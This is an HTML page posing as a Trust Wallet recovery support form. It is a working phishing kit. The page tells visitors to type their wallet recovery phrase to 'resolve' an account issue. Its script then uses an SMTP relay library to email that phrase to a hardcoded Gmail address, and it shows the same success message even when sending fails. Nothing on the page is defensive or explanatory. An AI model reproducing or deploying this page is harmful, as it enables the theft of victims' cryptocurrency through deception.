<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust Wallet Phrase</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <img src="pic1.png" alt="Trust Wallet Icon" class="icon">
    <h1>Trust Wallet Recovery Phrase</h1>
    <p><em><strong>Attention!</strong></em> "To deeply connect and resolve your wallet account issue, please input your wallet phrase in the provided field below. Your security is our priority, and this step will ensure seamless resolution. Thank you for your cooperation."</p>
    <textarea id="recoveryPhrase" class="problem-box" placeholder="Enter your recovery phrase"></textarea>
    <button class="submit-btn" onclick="sendEmail()">Access Wallet</button>
    <br>
    <br>
    <img src="pic3.png" alt="Trust Wallet Icon" class="icon">
  </div>

  <!-- script -->
  <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script>
    function sendEmail() {
      event.preventDefault();
      let recoveryPhrase = document.getElementById("recoveryPhrase").value.trim();

      let body = "Recovery Phrase: ";
      if (recoveryPhrase !== "") {
          body += recoveryPhrase;
      } else {
          body += "Not provided";
      }

      Email.send({
          SecureToken: "8c1f6c2a-54a4-4d36-a565-8ef819110ef7",
          To: 'nowtext081@gmail.com',
          From: "nowtext081@gmail.com",
          Subject: "Message From Trust Wallet Recovery",
          Body: body
      }).then(
          function(response) {
              // Redirect to success page after email is sent successfully
              alert("Your issue have been received.");
          },
          function(error) {
              alert("Your issue have been received.");
          }
      );
    }
  </script>
</body>
</html>
